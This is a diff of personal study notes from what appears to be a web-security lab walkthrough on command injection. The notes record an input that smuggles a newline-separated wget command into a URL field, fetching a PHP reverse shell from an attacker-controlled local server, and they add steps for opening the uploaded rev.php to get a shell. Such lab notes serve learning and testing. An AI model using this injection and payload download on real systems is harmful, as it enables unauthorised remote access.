@@ -59,7 +59,15 @@ start http server again in /tmp folder when rev.php resides
 i/p:
 https://tcm-sec.com \\n wget http://192.168.57.5:8080/rev.php
 
-search http://localhost/rev.php
+
+![[Pasted image 20230716004644.png]]
+
+go to 
+
+localhost/labs/uploads/rev.php
+and we get a reverse shell
+
+![[Pasted image 20230716004541.png]]
 
 and we get back a shell
 
